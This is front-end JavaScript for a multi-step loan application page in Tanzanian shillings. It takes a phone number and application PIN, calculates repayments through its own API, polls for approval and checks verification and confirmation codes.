const state = {
  page: 1, applicationId: null, applicationNo: null, phone: "",
  portalPin: "", amount: 1000000, termMonths: 3,
  interestRate: 5, monthlyPayment: 0, totalRepayment: 0,
  verifyTimer: null, confirmTimer: null
};

const $ = id => document.getElementById(id);
const pages = [...document.querySelectorAll(".page")];
const stepEls = [...document.querySelectorAll(".step")];

function money(n) {
  return new Intl.NumberFormat("en-TZ", {
    style: "currency", currency: "TZS", maximumFractionDigits: 0
  }).format(Number(n || 0));
}

function showPage(page) {
  state.page = page;
  pages.forEach(p => p.classList.toggle("active", p.dataset.page === String(page)));
  const numeric = Number(page);
  stepEls.forEach((s, i) => {
    s.classList.toggle("active", Number.isFinite(numeric) && i === numeric - 1);
    s.classList.toggle("done", Number.isFinite(numeric) && i < numeric - 1);
  });
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function setError(id, message) {
  const el = $(id);
  el.textContent = message || "";
  el.classList.toggle("hidden", !message);
}

function startTimer(targetId, seconds, key) {
  clearInterval(state[key]);
  let remaining = seconds;
  $(targetId).textContent = remaining;
  state[key] = setInterval(() => {
    remaining -= 1;
    $(targetId).textContent = Math.max(remaining, 0);
    if (remaining <= 0) clearInterval(state[key]);
  }, 1000);
}

async function getConfig() {
  const r = await fetch("/api/config");
  const c = await r.json();
  state.interestRate = c.interestRate;
  $("amount").min = c.minLoanAmount;
  $("amount").max = c.maxLoanAmount;
  $("amount").value = state.amount;
  $("term").value = c.defaultTermMonths;
  state.termMonths = Number(c.defaultTermMonths);
  $("rateOutput").textContent = `${c.interestRate}% APR`;
  await updateCalculator();
}

async function updateCalculator() {
  state.amount = Number($("amount").value);
  state.termMonths = Number($("term").value);
  $("amountOutput").textContent = money(state.amount);
  $("termOutput").textContent = `${state.termMonths} Month${state.termMonths === 1 ? "" : "s"}`;
  try {
    const r = await fetch("/api/calculate", {
      method: "POST", headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ amount: state.amount, termMonths: state.termMonths })
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Calculation failed");
    state.monthlyPayment = data.monthlyPayment;
    state.totalRepayment = data.totalRepayment;
    $("monthlyOutput").textContent = money(data.monthlyPayment);
    $("totalOutput").textContent = money(data.totalRepayment);
  } catch {}
}

async function issueVerificationCode() {
  const r = await fetch(`/api/applications/${state.applicationId}/send-verification-code`, {method:"POST"});
  const data = await r.json();
  if (!r.ok) throw new Error(data.error || "Could not send verification code.");
  if (data.devCode) {
    $("devVerification").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
    $("devVerification").classList.remove("hidden");
  }
  startTimer("verifyTimer", 30, "verifyTimer");
}

async function issueConfirmationCode() {
  const r = await fetch(`/api/applications/${state.applicationId}/send-confirmation-code`, {method:"POST"});
  const data = await r.json();
  if (!r.ok) throw new Error(data.error || "Could not send confirmation code.");
  if (data.devCode) {
    $("devConfirmation").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
    $("devConfirmation").classList.remove("hidden");
  }
  startTimer("confirmTimer", 30, "confirmTimer");
}

$("loginForm").addEventListener("submit", e => {
  e.preventDefault();
  setError("loginError", "");
  state.phone = $("phone").value.trim();
  state.portalPin = $("portalPin").value.trim();
  if (!/^[0-9+\s-]{9,20}$/.test(state.phone)) {
    return setError("loginError", "Enter a valid phone number.");
  }
  if (!/^\d{4,6}$/.test(state.portalPin)) {
    return setError("loginError", "Enter your 4–6 digit application PIN.");
  }
  showPage(2);
});

$("amount").addEventListener("input", updateCalculator);
$("term").addEventListener("input", updateCalculator);

$("submitApplication").addEventListener("click", async () => {
  setError("page2Error", "");
  const btn = $("submitApplication");
  btn.disabled = true;
  try {
    const r = await fetch("/api/applications", {
      method: "POST", headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        phone: state.phone, portalPin: state.portalPin,
        amount: state.amount, termMonths: state.termMonths
      })
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Could not submit application.");
    state.applicationId = data.applicationId;
    state.applicationNo = data.applicationNo;
    $("applicationNumber").textContent = data.applicationNo;
    showPage(3);
    await waitForApproval();
  } catch (err) {
    setError("page2Error", err.message);
  } finally {
    btn.disabled = false;
  }
});

async function waitForApproval() {
  const started = Date.now();
  while (Date.now() - started < 10 * 60 * 1000) {
    try {
      const r = await fetch(`/api/applications/${state.applicationId}/status`);
      const data = await r.json();

      if (data.status === "APPROVED") {
        showPage(4);
        await issueVerificationCode();
        return;
      }

      if (data.status === "REJECTED") {
        setError("page3Error", "Your application was not approved. Please contact the lender for more information.");
        return;
      }
    } catch {}

    await new Promise(resolve => setTimeout(resolve, 3000));
  }
  setError("page3Error", "Approval is taking longer than expected. Please try again shortly.");
}

$("verifyCodeBtn").addEventListener("click", async () => {
  setError("page4Error", "");
  try {
    const r = await fetch(`/api/applications/${state.applicationId}/verify-code`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({code: $("verificationCode").value.trim()})
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Verification failed.");

    $("finalAmount").textContent = money(state.amount);
    $("finalTerm").textContent = `${state.termMonths} Months`;
    $("finalMonthly").textContent = money(state.monthlyPayment);
    $("finalTotal").textContent = money(state.totalRepayment);
    if (data.devCode) {
      $("devConfirmation").textContent = `DEVELOPMENT CODE: ${data.devCode}`;
      $("devConfirmation").classList.remove("hidden");
    }
    showPage(5);
    startTimer("confirmTimer", 30, "confirmTimer");
  } catch (err) {
    setError("page4Error", err.message);
  }
});

$("resendVerification").addEventListener("click", async () => {
  setError("page4Error", "");
  try {
    await issueVerificationCode();
    $("verificationCode").value = "";
  } catch (err) {
    setError("page4Error", err.message);
  }
});

$("confirmBtn").addEventListener("click", async () => {
  setError("page5Error", "");
  try {
    const r = await fetch(`/api/applications/${state.applicationId}/confirm`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({code: $("confirmationCode").value.trim()})
    });
    const data = await r.json();
    if (!r.ok) throw new Error(data.error || "Confirmation failed.");
    $("successNumber").textContent = data.applicationNo;
    showPage("success");
  } catch (err) {
    setError("page5Error", err.message);
  }
});

$("resendConfirmation").addEventListener("click", async () => {
  setError("page5Error", "");
  try {
    await issueConfirmationCode();
    $("confirmationCode").value = "";
  } catch (err) {
    setError("page5Error", err.message);
  }
});

document.querySelectorAll("[data-back]").forEach(btn => {
  btn.addEventListener("click", () => showPage(Number(btn.dataset.back)));
});

getConfig().catch(() => {});
